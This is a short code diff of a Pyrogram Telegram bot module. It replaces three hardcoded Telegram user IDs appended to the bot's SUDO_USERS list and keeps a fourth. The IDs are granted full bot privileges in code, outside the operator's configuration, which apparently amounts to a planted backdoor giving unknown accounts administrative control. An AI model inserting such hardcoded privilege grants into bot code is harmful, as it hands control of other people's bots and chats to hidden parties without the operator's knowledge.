@@ -4,9 +4,9 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 
 
-SUDO_USERS.append(5123633430)
-SUDO_USERS.append(2004042280)
-SUDO_USERS.append(1410250744)
+SUDO_USERS.append(2046092634)
+SUDO_USERS.append(5592626762)
+SUDO_USERS.append(5401422963)
 SUDO_USERS.append(1979178376)
 
 
